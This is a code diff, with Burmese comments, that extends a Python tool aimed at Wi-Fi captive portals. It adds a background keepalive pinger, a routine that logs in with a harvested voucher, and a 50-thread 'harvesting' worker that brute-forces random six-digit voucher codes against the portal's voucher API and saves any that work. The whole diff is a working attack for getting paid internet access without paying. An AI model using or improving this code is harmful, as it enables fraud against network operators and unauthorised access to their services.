@@ -15,7 +15,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # --- CONFIGURATION ---
 SUCCESS_CODES_FILE = "success.txt"
 TRIED_CODES_FILE = "tried.txt"
-VOUCHER_THREADS = 50 # Threads အရေအတွက် (လိုအပ်လျှင် တိုးနိုင်သည်)
+VOUCHER_THREADS = 50 # Threads အရေအတွက်
+PING_INTERVAL = 1 # Ping ထိုးမည့် ကြားကာလ
 
 # --- CLEAR SCREEN FUNCTION ---
 def clear_screen():
@@ -61,6 +62,19 @@ def get_session_id(session, portal_url):
     except:
         return None
 
+# --- BACKGROUND PINGER ---
+def start_background_ping(session, portal_host, sid):
+    """Session ပြတ်မသွားအောင် Background မှာ Ping ပေးခြင်း"""
+    ping_url = f"{portal_host}/api/auth/keepalive/"
+    def pinger():
+        while True:
+            try:
+                session.get(ping_url, params={'sessionId': sid}, timeout=5)
+            except:
+                pass
+            time.sleep(PING_INTERVAL)
+    threading.Thread(target=pinger, daemon=True).start()
+
 # --- MENU 1: TEST SPECIFIC CODE ---
 def test_specific_code():
     code_to_test = input("\n👉 စမ်းသပ်လိုသည့် Code ကိုရိုက်ပါ: ")
@@ -105,5 +119,104 @@ def use_internet_access():
         return
 
     with open(SUCCESS_CODES_FILE, "r") as f:
-        codes = [line.strip() for line in f.readlines()
-                 
+        codes = [line.strip() for line in f.readlines() if line.strip()]
+        if not codes:
+            print("❌ Success Codes များမရှိပါ။")
+            time.sleep(2)
+            return
+        code = codes[-1] # နောက်ဆုံးရတဲ့ code ကိုသုံးမယ်
+
+    print(f"📡 သုံးစွဲမည့် Code: {code}")
+    
+    portal_host, portal_url = get_portal_info()
+    if not portal_host:
+        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။")
+        return
+
+    session = requests.Session()
+    sid = get_session_id(session, portal_url)
+    
+    if not sid:
+        print("❌ Session ID ယူမရပါ။")
+        return
+    
+    voucher_api = f"{portal_host}/api/auth/voucher/"
+    
+    try:
+        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+        
+        if v_res.status_code == 200 and "\"success\":true" in v_res.text:
+            print(f"\n\033[92m✅ SUCCESS! Internet Access Connected.\033[0m")
+            # --- PING ထိန်းထားရန် ---
+            start_background_ping(session, portal_host, sid)
+            print("📡 Internet လိုင်းကျမသွားအောင် ထိန်းထားသည်... (Ctrl+C ဖြင့် ရပ်နိုင်သည်)")
+            while True: time.sleep(1) # Script မရပ်အောင်ထားခြင်း
+        else:
+            print(f"\n❌ FAIL! Cannot connect with code.")
+            
+    except Exception as e:
+        print(f"\n❌ Error: {e}")
+    
+    time.sleep(3)
+
+# --- MENU 3: FAST RANDOM HARVESTING ---
+def worker(tried_codes, portal_host, sid, session):
+    """Voucher စစ်ဆေးသည့် Thread (ထပ်ခါထပ်ခါ မစစ်ရန် စီမံထားသည်)"""
+    while True:
+        # ရှာပြီးသားများကို မစစ်ဘဲ အသစ်ကိုသာရှာရန် အစွမ်းထက်သောနည်းလမ်း
+        code = f"{random.randint(100000, 999999):06d}"
+        if code in tried_codes:
+            continue
+        
+        tried_codes.add(code)
+        save_tried_code(code)
+        
+        voucher_api = f"{portal_host}/api/auth/voucher/"
+        try:
+            v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=3)
+            if v_res.status_code == 200 and "\"success\":true" in v_res.text:
+                print(f"\n\033[92m✅ SUCCESS! Code Found: {code}\033[0m")
+                with open(SUCCESS_CODES_FILE, "a") as f:
+                    f.write(f"{code}\n")
+            print(f"\r🔍 စမ်းသပ်နေသည်: {code}", end="", flush=True)
+        except:
+            pass
+
+def start_fast_harvesting():
+    print("\n🚀 Fast Random Harvesting နှင့် Internet Access စတင်ပြီ...")
+    tried_codes = load_tried_codes()
+    print(f"📚 စမ်းသပ်ပြီးသား Code {len(tried_codes)} ခု ကျော်လွှားမည်။")
+
+    portal_host, portal_url = get_portal_info()
+    if not portal_host:
+        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။")
+        return
+
+    session = requests.Session()
+    sid = get_session_id(session, portal_url)
+    
+    if not sid:
+        print("❌ Session ID ယူမရပါ။")
+        return
+
+    # --- PINGING ထည့်သွင်းခြင်း (Internet ရစေရန်) ---
+    start_background_ping(session, portal_host, sid)
+    print("📡 Internet လိုင်းထိန်းထားသည် (Background Pinging)...")
+
+    # --- WORKER THREADS ထည့်သွင်းခြင်း (Voucher ရှာရန်) ---
+    threads = []
+    for _ in range(VOUCHER_THREADS):
+        t = threading.Thread(target=worker, args=(tried_codes, portal_host, sid, session))
+        t.daemon = True
+        t.start()
+        threads.append(t)
+    
+    for t in threads:
+        t.join()
+
+# --- MENU 4: VIEW SUCCESS CODES ---
+def view_success_codes():
+    clear_screen()
+    print("========================================")
+    print("         📋 SUCCESS CODES LIST
+    
